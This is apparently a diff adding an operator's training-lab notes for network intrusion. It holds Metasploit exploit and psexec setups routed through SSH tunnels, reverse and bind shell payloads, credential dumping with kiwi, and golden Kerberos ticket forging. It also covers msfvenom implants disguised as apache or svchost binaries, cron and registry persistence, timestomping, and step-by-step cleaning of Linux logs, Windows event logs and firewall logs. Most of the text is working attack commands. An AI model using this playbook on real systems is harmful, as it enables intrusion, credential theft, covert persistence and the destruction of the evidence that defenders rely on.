+2. echo data to the port 
+	echo 2718281828 | nc 127.0.0.1 1822
+3. connect 
+	nc 127.0.0.1 18443
+}
+
+
+}
+
+# Exercise 2. Exploit through tuns - forward and reverse {
+Ops Box: 1337h4x.ops.local
+> Jump 1: linux.ramrod.lab (EXT IP: 100.64.36.17, INT IP: 192.168.1.102)
+	access via SSH port 2222. Creds: (mohunt / nancy123?)
+>> Target 1: byuro-shest.kerplakistan.net (EXT IP: 192.0.2.72)
+	Windows 7, access via bcaaa_bof exploit with a reverse call payload on port 8080.
+>>> Target 2: uchet-dva.kerplakistan.net (IP: 172.17.20.227)
+	Windows 7, access via bcaaa_bof exploit, with a bind shell payload on port 51135.
+
+# exploit 1 {
+use exploit/windows/misc/bcaaa_bof
+set RHOST 127.0.0.1
+set LHOST 100.64.36.17
+set LPORT 8080
+
+}
+
+
+# actions {
+ssh -x -v -p2222 mohunt@100.64.36.17 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L16102:192.0.2.72:16102 -R8080:127.0.0.1:8080
+nancy123?
+
+# for exploit to T2 
+portfwd add -L 127.0.0.1 -l 16103 -r 172.17.20.227 -p 16102
+portfwd add -L 127.0.0.1 -l 51135 -r 172.17.20.227 -p 51135 
+portfwd
+
+# exploit 2 {
+use exploit/windows/misc/bcaaa_bof
+set RHOST 127.0.0.1
+set RPORT 16103
+
+set payload windows/shell/bind_tcp
+set LPORT 51135
+set DisablePayloadHandler true
+
+# multihandler {
+set payload windows/shell/bind_tcp
+set LPORT 51135
+set RHOST 127.0.0.1
+
+}
+
+
+}
+
+}
+
+}
+
+# Exercise 3. More Exploits Through Tunnels - Enterprise Networks {
+
+Ops Box: 1337h4x.ops.local
+> Jump 1: web.drytortugas.lab (IP: 192.0.2.80), access via SSH port 22, Creds: www / Webific@ti0n
+>> Target 1: 192.168.106.52, access via bcaaa_bof exploit
+>>> Target 2: Windows 7 workstation, access via compromised local admin credentials
+>>>> Target 3: Domain Controller, access via compromised domain admin credentials
+
+# actions {
+
+ssh -x -v -p22 www@192.0.2.80 -L16102:192.168.106.52:16102 -R16103:127.0.0.1:16103 -R16104:127.0.0.1:16104 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+Webific@ti0n
+
+# exploit
+use windows/misc/bcaaa_bof
+set RHOSTS 127.0.0.1 
+set LPORT 16103
+set LHOST 172.17.10.80 # enum from J1 connection
+
+# migrate to 64bit payload
+run post/windows/manage/archmigrate SESSION=1 IGNORE_SYSTEM=true
+
+}
+
+# basic survey  {
+localtime
+getuid getpid 
+ipconfig
+sysinfo
+netstat 
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe"'. # if DC (dns) server
+ps
+route
+run post/windows/gather/enum_logged_on_users
+idletime
+show_mount
+run multicommand -cl 'netsh advfirewall show currentprofile'
+
+}
+
+#7. backup 
+run post/windows/manage/multi_meterpreter_inject PAYLOAD=windows/x64/meterpreter/reverse_tcp IPLIST=172.17.10.80 LPORT=16104 SESSION=1 HANDLER=true
+
+#9. enum & dump hashes 
+run post/windows/gather/enum_logged_on_users
+run post/windows/gather/smart_hashdump
+
+#10. network survey - ADSI management commands 
+load extapi
+
+``` ADD BELOW TO COMMANDS REF ``` 
+
+#11. dnsenum (get domain from sysinfo) - BOOT 
+adsi_computer_enum BOOT # list all computers in domain 
+	DC = ARCTIC, WIN7=HARMONIA, MARBLE 
+adsi_user_enum BOOT # user accounts in domain 
+	15 in Users group
+adsi_nested_group_user_enum -h 
+adsi_nested_group_user_enum BOOT "CN=Domain Admins,CN=Users,DC=boot,DC=lab" # which users are in "Domain Admins" group 
+	2 Domain Admins: Administrator, mwadmin 
+
+#11.5 STEAL user token (if SYSTEM cannot get info e.g. domain)
+steal_token [pid]
+ps # verify are now user (cant view bin paths), 'Operation failed: Access is denied' : may be bs 
+drop_token 
+
+#12. resolve IPs of 2 candidate win7 tgts 
+resolve HARMONIA 
+	192.168.106.51
+resolve MARBLE
+	192.168.106.50
+	
+	# validate if they are running smb 
+run multicommand -cl 'nbtstat -A 192.168.106.51'
+run multicommand -cl 'nbtstat -A 192.168.106.50' # responds = psexec candidate
+
+#13. pass the hash 
+	Add rule to T1 firewall, allow payload to call back to host/current metasploit sessions 
+	1. review ruleset 
+		run multicommand -cl 'netsh advfirewall firewall show rule name=all'
+	2. allow RDP 
+		run multicommand -cl 'netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389'
+	3. prep psexec 
+		bg 
+		use exploit/windows/smb/psexec
+	4. add route to send packets destined for T2 through existing session with T1 - easier than setting up new tunnels 
+		``` ADD ``` (route to network via meterpreter// metasploit framework)
+		route add 192.168.106.0 255.255.255.0 #<session number for route to be active on>
+		route add 192.168.106.0 255.255.255.0 1
+	5. psexec module setup 
+		set RHOSTS 192.168.106.50
+		set LPORT 3389
+		set LHOST 192.168.106.52
+		set payload meterpreter/reverse_tcp # 32bit since unsure if 32 or 64bit arch. if 64, would have x64/ in name
+		set SMBUser Administrator
+		set SMBPass <HASH> 
+			set SMBDomain !BLANK! (since use local not domain creds)
+	``` REMEMBER: psexec uses powershell.exe by default, so LOGGING. Also check EVENT logs from exploit```
+
+#15. Heavy survey T2 {
+
+#What is the date/time on remote target?
+localtime
+	2023-07-19 02:48:03
+#What is the time zone of the remote target? 
+localtime
+#What is the IP and MAC address of remote target? 
+ipconfig
+#What is the hostname of the remote target? 
+sysinfo
+#List your backdoor connection information (remote IP and port, PID, UID and working directory) 
+getpid,getuid,pwd (and info from your opening session line)
+#What privileges are enabled for the UID you are running under? 
+run multicommand -cl 'whoami /priv'
+#What is the OS (include version, build, and service pack)? 
+sysinfo
+#What is the system architecture? 
+sysinfo
+#What is the system language? 
+sysinfo
+#What is the workgroup/domain? 
+sysinfo
+#How much Total and Free physical memory is present on the target host? 
+run multicommand -cl 'cmd /c systeminfo' 
+	(or post/windows/gather/wmic_command COMMAND="computersystem get TotalPhysicalMemory" and post/windows/gather/wmic_command COMMAND="OS get FreePhysicalMemory")
+#Which DNS server(s) does the host use? 
+run multicommand -cl 'netsh interface ip show config'
+#What is the primary gateway and netmask of the remote target? 
+route
+#Review the process list. Are there any network services running? If so, what are they? 
+ps 
+run post/windows/gather/enum_services
+#Are there any executables that appears to be malicious or security-related (list their corresponding PID and full path)? 
+ps
+netstat
+	run multicommand -cl 'cmd /c netstat -ano | findstr /v "PID of dns.exe"'. # if DC (dns) server
+	Review the list of network connections and sockets that are listening. Are any connections between the target and any other computers (not including your own connection)? Provide the connections PID, process name, local IP/port, and /remote IP/port netstat
+run post/windows/gather/wmic_command COMMAND='process get executablepath' 
+run post/windows/gather/wmic_command COMMAND='process get commandline | more' 
+
+
+#List the names of logged-on users, how long they have been idle and which users have recently logged on. 
+run post/windows/gather/enum_logged_on_users
+idletime
+#List any services set to run at boot/login 
+run post/windows/gather/enum_services
+#List the patches installed on the target. 
+run multicommand -cl 'cmd /c systeminfo
+#List any scheduled tasks related to malware or security 
+run multicommand -cl 'schtasks /query'
+#List installed third-party (non-Microsoft) applications 
+run post/windows/gather/enum_applications
+#Are there any installed security products that are enabled? 
+run getcountermeasure 
+ps
+
+	- plus a review of the process list, startup programs, and installed programs and services
+#If there is a firewall present, what is it's status? 
+run multicommand -cl 'netsh advfirewall show currentprofile'
+#What is the value of %windir% (and other environment variables)?
+run post/multi/gather/env
+#List the drives that are present on the target host 
+show_mount
+#List the network shares on the target host 
+run multicommand -cl 'net share'
+#Review the relevant registry start up keys and values (HKLM and HKCU run and runonce keys for example) 
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\run'
+reg enumkey -k 'HKLM\software\microsoft\windows\currentversion\runonce'
+//reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\run' # debug
+//reg enumkey -k 'HKCU\software\microsoft\windows\currentversion\runonce' 
+//reg enumkey -k 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
+
+#Is auditing enabled or not? If so, what events are enabled? 
+run multicommand -cl 'cmd /c auditpol /get /category:*'
+#What user accounts are present on the system?
+run multicommand -cl 'net users'
+#What groups are present on the system and what users are members of the administrators group? 
+run multicommand -cl 'net localgroup administrators'
+#What is the account lockout policy? 
+run multicommand -cl 'net accounts'
+#Are there any event log entries related to your operations? 
+run multicommand -cl 'psloglist.exe (any filters you want to use) [SYSTEM|SECURITY|APPLICATION]'
+	run multicommand -cl 'psloglist.exe -m 60 SYSTEM'
+	run multicommand -cl 'psloglist.exe -m 60 SECURITY'
+	run multicommand -cl 'psloglist.exe -m 60 APPLICATION'
+#Are there any files with a .doc(x), .xls(x), .ppt(x), or .pdf extension? If so, what directories are they primarily in? 
+search -f *.doc
+search -f *.xls
+search -f *.ppt
+search -f *.pdf
+#Are there any other log files related to your activities? If so, what is their full path and name? 
+run multicommand -cl 'cmd /c dir c:\*.log /S /A /od /tw'
+#Search TODAY'S logs 
+run multicommand -cl 'cmd /c dir c:\*.log /S /A | findstr "DD/MM/YYYY"'
+
+#Are there any error logs or dump files related to your activities? If so, what is their full path and name? 
+search -f *.wer 
+and then review corresponding log files if they have a mod/write time of when you were active on the host.)
+
+
+}
+
+#16. Gather domain admin creds 
+load kiwi 
+	help 
+creds_kerberos # get domain creds 
+kiwi_cmd sekurlsa::logonpasswords # LSASS memory 
+	
+	
+#17. Privesc - migrate (steal token does not allow to read another users memory hive)
+ps 
+migrate 1636
+bg 
+
+# to rexploit back on T2, modify firewall rule on T1 
+run multicommand -cl 'netsh advfirewall firewall show rule name=all status=enabled'
+ 
+run multicommand -cl 'netsh advfirewall firewall set rule name=callforhelp new remoteip=any'
+run multicommand -cl 'netsh advfirewall firewall show rule name=callforhelp'
+bg 
+
+# privesc exploit 
+windows/local/ms14_058_track_popup_menu
+set SESSIONS 3
+set LHOST 192.168.106.52
+set LPORT 55555
+
+# ensure exploit binds to T1, not local ops box default
+set reverselistenerbindaddress 192.168.106.52
+set reverselistenerbindport 55555
+
+#18. T3 - DC exploit 
+
+# modify T2 firewall rules 
+run multicommand -cl 'netsh advfirewall firewall add rule name="g3r0g3r0" dir=in action=allow protocol=TCP localport=1337'
+run multicommand -cl 'netsh advfirewall firewall show rule name="g3r0g3r0"'
+
+
+# portfwd add -R 127.0.0.1 -l 33333 -r 127.0.0.1 -p 33333 // not using this method 
+
+exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp # for redundancy
+set LPORT 33333 
+set LHOST 192.168.106.50
+set RHOST 192.168.106.13
+	resolve ARCTIC (from earlier enum) -> 192.168.106.13
+set SMBUser mwadmin
+set SMBPass TwoFl0wer!
+set SMBDomain BOOT # our domain, not arctic apparently 
+set ReverseListenerComm 4 
+
+
+#21. golden kerberos ticket : access network at any time
+load kiwi
+golden_ticket_create
+golden_ticket_create -u mossa -d BOOT.LAB -k e3525f929737b049649b9867f1351074 -s S-1-5-21-348695234-4083971140-3581807652 -t /root/goldenboi
+												^ 2nd half of krbtgt hash 
+												
+#22. 
+bg
+sessions -i 4 (T2 system account) 
+load kiwi 
+kerberos_ticket_list 
+run multicommand -cl 'cmd /c dir \\ARCTIC\C$' # shud NOT work 
+kerberos_ticket_purge # purge tickets 
+kerberos_ticket_use /root/goldenboy # upload GOLD 
+kerberos_ticket_list
+run multicommand -cl 'cmd /c dir \\ARCTIC\C$' # works 
+
+run multicommand -cl 'net group "Domain admins" mossa /add /domain'
+run multicommand -cl 'net group "Domain admins" /domain'
+}
+
+# Exercise 4. Deploying an Implant {
+Ops Box: 1337h4x.ops.local
+> Jump 1: mail.fatdeer.lab (IP: 198.18.30.13)
+	access via SSH port 22, Creds: remoteuser / remote
+>> Target 1: wagner-pmc.kerplakistan.net (Ext IP: 192.0.2.126) / 192.168.255.35 
+	access via SSH port 2222, Creds: vakha / Andanov, root / Musicians
+>>> Target 2: zarya.kerplakistan.net (192.168.180.42)
+	access via pre-implanted windows/meterpreter_bind_tcp backdoor listening on TCP/17501
+>>>> Target 3: leshiy.kerplakistan.net (192.168.181.72)
+	access via psexec exploit using meterpreter/reverse_tcp payload. Creds: administrator / Luhansk2
+
+Specific Instructions:
+
+Target 1: Prepare and deploy a linux/x64/meterpreter/bind_tcp implant, once installed, connect to the backdoor to ensure it works properly.
+Target 3: Send the exploit from Target 2 but have the payload call back to Target 1.
+Target 3: Prepare and deploy a windows/meterpreter/bind_tcp implant, once installed, connect to the backdoor to ensure it works properly.
+
+# actions {
+
+#J1 {
+ssh -x -v -p22 remoteuser@198.18.30.13 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L2221:192.0.2.126:2222
+remote
+
+}
+
+#T1 { 
+ssh -x -v -p2221 vakha@127.0.0.1 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+Andanov
+
+su root
+Musicians
+
+192.168.255.35
+x86_64
+
+# implant - meterpreter bind_tcp disguised as trafficserver / apache2 cron persistence {
+
+iptables -nvL # confirm no filter issues for implant 
+
+# create implant 
+msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=8088 -f elf > bind64-8088
+file bind64-8088
+
+#upload implant 
+scp -P2221 bind64-8088 vakha@127.0.0.1:/home/vakha/trafficserver
+
+# mod perms 
+chmod u=rwx,g=rx,u=rx trafficserver
+ps -elf apache2
+	/usr/sbin/apache2 
+stat /usr/sbin/apache2 
+	2019-01-29 13:33:09.00000000
+	
+# blend it in 
+ls -al /usr/sbin/trafficserver # confirm doesnt exist 
+mv /home/vakha/trafficserver /usr/sbin/trafficserver
+touch -r /usr/sbin/apache2  /usr/sbin/trafficserver
+
+# execute 
+/usr/sbin/trafficserver &
+netstat -punta # confirm listener on 8088
+
+# test connect from J1 
+~+C 
+-L8088:192.0.2.126:8088
+
+# on ops 
+msfconsole -qn
+spool /root/log
+use exploit/multi/handler
+set payload linux/x64/meterpreter/bind_tcp
+set RHOST 127.0.0.1
+set LPORT 8088
+show options
+run 
+
+getuid
+getpid
+shell 
+	netstat -natp
+	ps -eaf | grep traffic 
+exit 
+
+# on T1, establish persistence; edit apache2 cron script 
+cd /etc/cron.daily
+stat apache2
+	2015-03-15 05:52:33
+sed -i '20i exec /usr/sbin/trafficserver &' apache2
+cat -n apache2 
+touch -t 201503160552 apache2
+./apache2 # confirm 8088 listening
+}
+
+}
+
+
+#T2 {
+
+# conn to T2 {
+# on T2 
+~+C 
+-L17501:192.168.180.42:17501
+
+# on ops 
+use exploit/multi/handler 
+set payload windows/meterpreter_bind_tcp
+set LPORT 17501
+set RHOST 127.0.0.1
+
+sysinfo
+getuid
+ipconfig
+netstat
+	ZARYA, x64, SYSTEM
+	DbxSync.exe p17501
+
+
+}
+
+# psexec to T3. can we reach it / 445?
+run multicommand -cl 'netsh advfirewall show currentprofile'
+	public on, block Inbound, allow outbound
+
+# download and review enabled outbound rules 
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=all dir=out status=enabled > rules'
+download rules.txt
+del rules.txt
+	# none blocking outbound 445. one specifically allowing, but for Domain profile
+
+# LPF for psexec 
+portfwd add -L 127.0.0.1 -l 445 -r 192.168.181.72 -p 445
+
+}
+
+#T3 {
+
+# psexec setup, callback to target 1 {
+use windows/smb/psexec 
+set payload windows/meterpreter/reverse_tcp (default)
+set LHOST 192.168.255.35
+set LPORT 8443
+set RPORT 445
+set RHOST 127.0.0.1
+set SMBUser administrator
+set SMBPass Luhansk2
+
+# T1 RPF to catch callback, add rule and tunnel to allow traffic and RPF 
+iptables -I INPUT 1 -s 192.168.181.72 -p tcp -j ACCEPT
+~+C
+-R8443:127.0.0.1:8443
+	#CLEANUP 
+	iptables -D INPUT 1 -s 192.168.181.72 -p tcp --dport 8443 -j ACCEPT
+
+run 
+
+
+}
+
+# survey 
+sysinfo 
+getuid
+ipconfig 
+netstat 
+	LESHIY
+	x64
+	SYSTEM 
+	powershell.exe 
+	3389 is NOT bound 
+	
+# implant config {
+run multicommand -cl 'netsh advfirewall show currentprofile'
+	Public On, BlockInbound, AllowOutbound
+
+# review inbound rules, determine if 3389 good implant port 
+run multicommand -cl 'cmd /c netsh advfirewall firewall show rule name=all dir=in verbose > rules'
+download rules
+del rules
+	yes, Remote Desktop rule allows 3389 in
+	
+	wierd but ok il make another rule... 
+run multicommand -cl  "cmd /c netsh advfirewall firewall add rule name=\"Remote Assistance\" dir=in protocol=tcp localport=3389 profile=public action=allow"
+	profile=any ? 
+# create payload 
+cd c:/windows/syswow64
+download svchost.exe # use as template for implant 
+
+msfvenom -p windows/meterpreter/bind_tcp LPORT=3389 -f exe -x /root/svchost.exe > services.exe
+	# same size as template file~ 
+
+# upload 
+upload services.exe 
+
+#timestomp 
+dir svchost.exe
+	2009-07-13 21:14:43 
+
+timestomp -m '07/13/2009 21:14:43' services.exe 
+
+# execute implant 
+execute -f services.exe
+
+}
+
+# test connection through T1 {
+
+# on T1 
+~+C
+-L3389:192.168.181.72:3389
+use multi/handler 
+set payload windows/meterpreter/bind_tcp 
+	``` NOTE! THERE IS A DIFFERENCE BETWEEN ``` windows/meterpreter/bind_tcp and the default windows/meterpreter_bind_tcp 
+set RHOST 127.0.0.1 
+set RPORT 3389
+
+
+
+
+}
+
+# persistence - registry key on startup. since 32bit program, need to add to wow6432node hive 
+	- HKLM hive so not tied to system, not a user
+reg setval -k 'HKLM\software\wow6432node\microsoft\windows\currentversion\run' -v "Remote Assistance" -d "c:\windows\syswow64\services.exe" -t REG_SZ
+
+reg queryval -k 'HKLM\software\wow6432node\microsoft\windows\currentversion\run' -v "Remote Assistance" 
+
+}
+
+
+# cleanup {
+
+- exit out of sessions T3 
+delete T2 portfwd 
+	portfwd del -L 127.0.0.1 -l 445 -r 192.168.181.72 -p 445
+
+restore/remove firewall rules T1 
+	iptables -D INPUT 1
+
+
+}
+
+
+}
+
+
+}
+
+
+}
+
+``` 2.3 Post Exploit Survey ``` {
+# NOTES {
+
+# MAIN 2 CLEAN WIN/NIX {
+Windows:
+	- Event logs (system,app,security)
+	- firewall logs (if enabled) 
+	- IIS/SQL logs if set 
+	- wmic/powershell if set 
+	* - PREFETCH DIR : pointers to recently ran programs 
+		- programs will speed up subsequent app launches
+	* Microsoft Error Debugger mechanism 
+		Dr. Watson (XP) - starts when service/program crashes. Logs mem dump (64kb), pushes to microsoft 
+			- MUST delete. could hve files 
+		Windows Error Reporting (WER) - modern windows - dump file (think core dump!)
+		pre-vista: at = logs activity
+			C:\Windows\SchedLgU.txt - entries for all succ/fail scheduled events 
+			schtasks - does NOT log
+		
+Linux 
+	- /var/log
+	- utmp/btmp/wtmp - logins 
+	- .history 
+		- check /etc/syslog.conf /rsyslog / rsyslog-ng 
+	- core dumps (linux variant of debug/memory dumps = core files) 
+		ulimit -c = 0 -> core dubbing disabled 
+		core contains X amount of running mem when app crashes. defined in /etc/security/limits.conf 
+		/root/core 
+		most distros disable (since was used by hax0rs)
+}
+
+# Remote Logging, Log rotate/roll, Delayed writing { 
+Remote Logging 
+- probably centralized aggregator > triages and alerts
+- FORTUNATELY: many systems send logs on PRESET SCHEDULE e.g. Acme sends every 30 mins 
+	- can clean logs before local copy is sent off
+
+Log rotation 
+- most log files, espec. linux ROTATE on: fixed sched // hit size threshold 
+- some progs. compress older logs w/tar or gzip 
+Log roll - overwrite older events when hit size threshold 
+- windows event logs 
+	- may need to stop certain procs. before cleaning logs 
+	- e.g. WIN FIREWALL - if enabled 
+	- solution?: wait until log is rotated & not open by the process 
+		CONSIDER: Having your IP address logged and then cleaned may outweigh the 
+		risk of having those benign service start/stop entries in the event log
+
+Delayed writing : timer hit or event met (e.g. proc exits)
+	- .bash_history: history saved in MEM, written to bash history when shell closed out
+	- logout/disconnect logs: SSH session close 
+}
+
+# Add Considerations: File residue, hanging procs, to clean or not to clean? {
+# File Residue
+temp files created after running tools/scripts 
+- e.g. uploadexec on meterpreter. tempfile of uploaded bin to %TEMP% directory. doesnt ALWAYS auto delete 
+- operator makes copies IOT/WHILE log clean 
+- shit that happens 
+	- dump file: if mistakenly crashed system 
+	- login to user who has never logged in before (ENTIRE USER PROFILE DIR IS CREATED == clean)
+	- file upload? must delete when done 
+
+# Hanging Processes 
+- processes relating to: 
+	- migrating to another owner (hanging bc using it)
+	- change privileges (hacked privesc proc) 
+
+# To clean or not to Clean (opt for logrotate/logroll...?) || Risk VS Reward
+- is it feasible?
+- will cleaning log cause bigger disruption?
+	- e.g. cleaning SQL database log = shut off service SQL database = system outage
+		--> opt to wait for LOGROTATE
+- ask:
+	- do logs incriminate?
+	- do logs capture my IP?
+	- did elements of exploit/unique string get logged? 0 day compromised?
+- most benign log considerations 
+	- logging in as legit user 
+	- start/stop service (still be careful though)
+}
+}
+
+# NIX CLEANING + .history (LOGIN) {
+- clean with standard UNIX commands (unless binary like w/u/btmp)
+- not locked by parent process
+- requires ROOT 
+
+# example - find files mod within last 10 mins 
+find /var/log -type f -mmin -10 2> /dev/null 
+tail -n30 <log>
+
+#1. check presence - may need to clean harder than IP
+egrep "<IP>|<PID>|<ACCESS-PORT>|<TIMESTAMP>" <file>
+#2. create clean 
+egrep -v "sshd\[1369\]" /var/log/secure > /tmp/secure.clean
+#3. confirm removed 
+egrep "<IP>|<PID>|<ACCESS-PORT>|<TIMESTAMP>" <file>
+tail -n30 <file>
+#4. overwite file 
+cat /tmp/secure.clean > /var/log/secure
+#5. timestomp 
+touch -r <ref> <file> # last files in dir 
+touch -t YYYYMMDDHHMM.SS
+#6. clean files 
+rm -rf /tmp/secure.clean
+
+
+# ON LOGIN
+unset HISTFILE
+# if must clean after write... 
+cp /dev/null > history
+wc/tail to clean specific entries 
+
+}
+
+# WINDOWS CLEANING (event logs - (A,S,S), pfirewall.log, Prefetch) {
+- no commercial tools for surgically cleaning...
+- either leave incriminating logs... or delete the ENTIRE log 
+
+# TYPICAL EVENT LOG CLEAR {
+
+#1. query entry for exploit log 
+run event_manager -l security -f 529
+#2. CLEAR OUT security log = GENERATES another log > beats leaving zeroday evidence
+run event_manager -c security 
+	#2.5 run event_manager -i 
+		// notice additional log num created in SEC 
+	#2.6 check 'log clear' log - [SEC 517]
+		run event_manager -l security -f 517
+	#2.9 CONSIDER 
+		- typically 517 doesn't alert centralized sec info /SIEM. some sec admins create custom alert...
+		- may be best wait for logrotate/ more entries obscure
+}
+		
+# APPLICATION SPECIFIC LOG Considerations {
+- starting/stopping apps - to event logs 
+- app specific info usually in pushed to ANOTHER log
+	- e.g. GET/POST IIS requests 
+	- exploit string, time, src IP probably in weblogs
+- Event log issue:
+	- must STOP service to clean original log -> this creates additional entries 
+	- benign service stop/start log > incriminating entry
+
+}
+		
+# FIREWALL LOG CLEANING {
+
+#0. time on login 
+localtime 
+#1. determine: firewall running? is logging enabled? where logfile located? fw logging policy?
+run multicommand -cl 'netsh advfirewall show currentprofile'
+	pfirewall.log # default 
+ls c:/windows/system32/logfiles/fierwall/pfirewall.log # default loc AFTER xp
+cd c:/windows/system32/logfiles/fierwall/pfirewall.log
+#2. search for IP 
+run multicommand -cl 'findstr "192.168.106.20" pfirewall.log'
+	// 2.5. IP too broad? search for timestamp
+#3. write clean copy to c:/windows/temp - (findstr /v > newfile)
+run multicommand -cl 'cmd /c findstr /v /c:"2022-07-11 10:59" pfirewall.log > c:/windows/temp/sd102.tmp'
+#4. confirm string remove 
+cd c:/window/temp
+run multicommand -cl 'cmd /c findstr /c:"2022-07-11 10:59" c:/windows/temp/sd102.tmp'
+#5. Disable firewall - IOT overwrite pfirewall.log 
+	- disable firewall (causes baloon on user desktop & even entries) 
+	- so check if SCREENSAVER is running & user idletime 
+ps # check for logon.scr // *.scr 
+idletime 
+run multicommand -cl 'netsh advfirewall set currentprofile state off' # disable firewall, otherwise generate LARGE GAPS in log
+
+#6. find time of last log entry 
+type or cat .log file # if log is SMALL 
+	
+	# get LINE-COUNT 
+	run multicommand -cl 'cmd /c type sd102.tmp  find /c /v ""'
+	# display only last lines of file (starting at line +NUM) 
+	run multicommand -cl 'cmd /c more sd102.tmp +1548' # displays last 2 lines
+
+#7. overwrite original log file
+run multicommand -cl 'cmd /c move sd102.tmp c:/windows/system32/logfiles/firewall/pfirewall.log'
+
+#8. timestomp
+timestomp -m "07/11/2022 11:11:18" c:/windows/system32/logfiles/firewall/pfirewall.log
+	
+#9. reenable firewall 
+run multicommand -cl 'netsh advfirewall set currentprofile state on'
+
+}
+
+# PREFETCH {
+- native host commands or host shell, probably created prefetch pointers 
+
+# view prefetch by date/write time
+cd c:/windows/prefetch 
+run multicommand -cl "cmd.exe /c dir /A /o:d /t:w"
+
+
+}
+
+# WINDOWS ERROR REPORTING (dump files + error logs) {
+- windows XP/2003 systems = Dr. Watson 
+	dump files = .dmp, error logs = .dmp
+- vista and newer systems = C:\ProgramData\Microsoft\Windows\WER\*
+	- dump files = .hdmp/ .mdmp, error logs = .wer 
+
+# system find dump/log files
+run multicommand -cl "cmd.exe /c dir c:\\*.*dmp /S /A"
+	e.g. cd c:/docume~1/alluse~1/applic~1/micros~1/drwats~1
+# DECISION: to clean or not to clean? rule of thumb-
+	- remove dump + error log files IF times are within timeframe of connected to remote tgt 
+
+
+
+}
+
+# FILE RESIDUE + HANGING PROCS {
+- kill started procs 
+	- tool, shell
+- delete uploaded files before closing session
+	ls c:\windows\temp
+
+}
+
+}
+
+# Exercise 1. Covering Your Tracks ver 2.1 {
+Ops Box: 1337h4x.ops.local
+> Jump: web.drytortugas.lab (EXT IP: 192.0.2.80), access via SSH port 22, Creds: www / Webific@ti0n
+>> Target 1: linux.ramrod.lab (EXT IP: 100.64.36.17, INT IP: 192.168.1.102), access via SSH port 2222, Creds: root / P@$$w0Rd123
+>> Target 2: win7.ramrod.lab (EXT IP: 100.64.36.17, INT IP: 192.168.1.103), Win7, access via psexec exploit using x64/meterpreter/reverse_tcp payload. Creds: administrator / keywest123!
+
+#J1 {
+ssh -x -v -p22 www@192.0.2.80 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L2221:100.64.36.17:2222
+Webific@ti0n
+
+# survey {
+The following items should be documented during the survey:
+Date
+System version
+Current logged on users
+Most recent logged on users (48 hours)
+System up time
+Available system memory
+Hostname
+IP address/subnetmask of active interfaces (not including localhost)
+Any suspicious network connections
+Any suspicious open sockets
+Any suspicious processes
+Any cron jobs scheduled to run in the next 4 hours
+
+
+}
+
+
+}
+
+#T1 {
+ssh -x -v -p2221 root@localhost -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
+P@$$w0Rd123
+
+# stop auditd 
+ls -latr /var/log/audit/audit.log
+tail -n10 /var/log/audit/audit.log
+date -d "@<epoch>"
+
+service auditd stop
+	# creates entry!!!
+
+# cleaning EXAMPLES {
+Cleaning by date: grep -v "Mmm DD HH:MM:ss" original.log > new.log
+Cleaning by PID: grep -v "processname\[pid\]" original.log > new.log
+Cleaning by string: grep -v "your string here" original.log > new.log
+
+}
+
+# log.1 / log.2 {
+rw-r------ root root May 23 08:19 
+-rw------- root adm May 23 13:08 
+
+``` note: ``` - pay attention to related TIMESTAMPS, related PIDs, session open/close, log/disconnect etc.
+
+# log 1 
+	-SSH 
+egrep "May 23" /var/log/log.1 // "sshd\[2079\]|su\[2091\]|logind\[667\]" 10 logs for admin login activity 
+egrep "May 16" /var/log/log.1 // "May 16 05:03:02|May 16 05:03:13" 6 logs for login1
+								 "May 16 06:10:07|May 16 06:14:36" 8 for login 2
+	
+egrep "sshd\[2079\]|su\[2091\]|logind\[667\]|May 16 05:03:02|May 16 05:03:13|May 16 06:10:07|May 16 06:14:36" /var/log/log.1
+egrep -v "sshd\[2079\]|su\[2091\]|logind\[667\]|May 16 05:03:02|May 16 05:03:13|May 16 06:10:07|May 16 06:14:36" /var/log/log.1 > /tmp/log1.clean
+egrep "sshd\[2079\]|su\[2091\]|logind\[667\]|May 16 05:03:02|May 16 05:03:13|May 16 06:10:07|May 16 06:14:36" /tmp/log1.clean
+cat  /tmp/log1.clean > /var/log/log.1
+rm -rf /tmp/log1.clean
+touch -t 202305230819.20 /var/log/log.1 # last entry in log  
+
+# log 2 
+egrep "192.168.1.101" /var/log/log.2 
+egrep -v "May 23 12:28:07" /var/log/log.2 > /tmp/log2.clean
+egrep "192.168.1.101" /tmp/log2.clean
+cat /tmp/log2.clean > /var/log/log.2
+touch -t 202305231308.09 /var/log/log.2
+rm -rf /tmp/log2.clean 
+wc -l  /var/log/log.2
+}
+
+# secure/messages log clean {
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -60 -type f -print0 | xargs -0 ls -latr 
+
+find /var/log -mmin -X 
+	find /var/log -mmin -60
+
+find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -290 -type f -print0 | xargs -0 ls -latr 
+
+# search 
+cat /var/log/secure | egrep "192.0.2.80|2736|2730|13:29:46"
+cat /var/log/messages | egrep "192.0.2.80|2736|2730|13:29:46"
+// cat /var/log/cron | egrep "192.0.2.80|2736|2730|13:29:46"
+
+# clean 
+cat /var/log/secure | egrep -v "192.0.2.80|2736|2730|13:29:46" > /tmp/secure.clean 
+cat /var/log/messages | egrep -v "192.0.2.80|2736|2730|13:29:46" > /tmp/messages.clean 
+
+#verify 
+egrep "192.0.2.80|2736|2730|13:29:46" /tmp/secure.clean 
+egrep "192.0.2.80|2736|2730|13:29:46" /tmp/messages.clean 
+
+cat /tmp/secure.clean > /var/log/secure &&
+cat /tmp/messages.clean > /var/log/messages
+
+touch -t 2023 07212009.03 /var/log/secure
+touch -t 2023 07220101.01 /var/log/messages
+
+cat /dev/null > /var/log/wtmp 
+cat /dev/null > /var/log/lastlog 
+
+# delete 
+rm -rf /tmp/secure*
+rm -rf /tmp/message*
+
+}
+
+# /var/log/audit/audit.log clean {
+- check for your login METHOD and login general 
+	exe="/usr/sbin/sshd"
